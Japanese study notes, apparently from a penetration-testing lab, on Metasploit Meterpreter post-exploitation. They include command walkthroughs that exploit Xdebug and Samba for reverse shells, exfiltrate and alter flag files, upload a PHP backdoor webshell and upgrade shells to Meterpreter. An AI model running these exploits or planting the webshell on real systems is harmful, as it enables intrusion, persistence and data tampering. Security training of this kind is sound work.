metrepreter:fundamentals
・Post exploitationとは、初期アクセスを取得した後にターゲットシステム上で実行される一連の操作
・ペンテスのpost exploitation段階には、次のような手法がある
1) ローカル列挙
2) 権限昇格
3) ハッシュダンプ
4) 永続的アクセス確立
5) 追跡の消去
6) ピボティング

・meterpreterペイロードは、DLL注入を介して動作し、ターゲットシステムのメモリ上で実行される高度で多機能なペイロードであり、そのため検出が困難
・meterpreterはステージャーソケット経由で通信し、ターゲット上で攻撃者にインタラクティブなコマンドインタプリタを提供する
これにより、システムコマンドの実行、ファイルシステムの操作、キー入力の記録が行える
・meterpreterはカスタムスクリプトやプラグインを動的に読み込むことができる
・msfは、ターゲット環境やOSアーキテクチャに応じて使えるさまざまな種類のmeterpreterペイロードを提供している

demo target machineでシェルを奪う
1) nmap -sC -sV target
2) dirb http://target
3) curl http://target/phpinfo.php
4) ターゲットサーバーでxdebug拡張機能を有効化しているときには、以下で悪用する
msfconsole -q
use exploit/unix/http/xdebug_unauth_exec
set RHOSTS target
set LHOST my_ip
exploit
5) リモートマシン上の現在の作業ディレクトリを確認する
pwd
6) リモートマシン上の現在の作業ディレクトリにあるファイルを一覧表示にする
ls
7) ローカルマシン上の現在の作業ディレクトリを確認する
lpwd
8) ローカルマシンの現在の作業ディレクトリにあるファイルを一覧表示にする
lls
9) フラグをcatコマンドで取得
cat /app/flag1
10) フラグ値を変更して、他のユーザが正しいフラグを取得できないようにする
edit /app/flag1
cat /app/flag1
11) 現在の作業ディレクトリを/app内の疑わしい名前のディレクトリに変更し、そのディレクトリにある隠しファイルからフラグを読み取る
cd "Secret Files"
ls
cat .flag2
12) flag5.zipをローカルマシンに取得し、パスワード56784を使用して開く。
cd /app
download flag5.zip
13) 新しいターミナルを開く
ls
unzip flag5.zip
cat list
14) ディレクトリから.zipファイルを削除する
rm flag5.zip
15) 抽出されたファイルに記載されているファイルのチェックサムを出力する
checksum md5 /bin/bash
16) リモートマシンのPATH環境変数を確認する。
getenv PATH
17) PATH変数に含まれる場所の1つに名前「ckdo」という文字列を含むファイルがあり、そのファイルに隠されたフラグを出力する
search -d /usr/bin -f *ckdo*
18) ローカルマシンのツールディレクトリに変更する
lcd /root/Desktop/tools
19) PHP webshellをリモートマシンのappディレクトリにアップロードする
upload /usr/share/webshells/php/php-backdoor.php

コマンドシェルをmeterpreterシェルにアップグレードする
demo シェルをアップグレードする
1) ping -c 4 target
2) nmap -sV target
3) msfconsole
4) use exploit/linux/samba/is_known_pipename
5) 基本情報の設定をする
set RHOSTS
6) exploit
7) whoamiで権限を確認する
8) Ctrl+Zでセッションをバッググラウンドで実行する
9) shell_to_meterpreterモジュールをセットする
use post/multi/manage/shell_to_meterpreter
10) LHOSTおよびSESSION IDオプションを構成する
set SESSION
set LHOST
run
11) 次にコマンドでmeterpreterセッションと会話するようにする
sessions 2

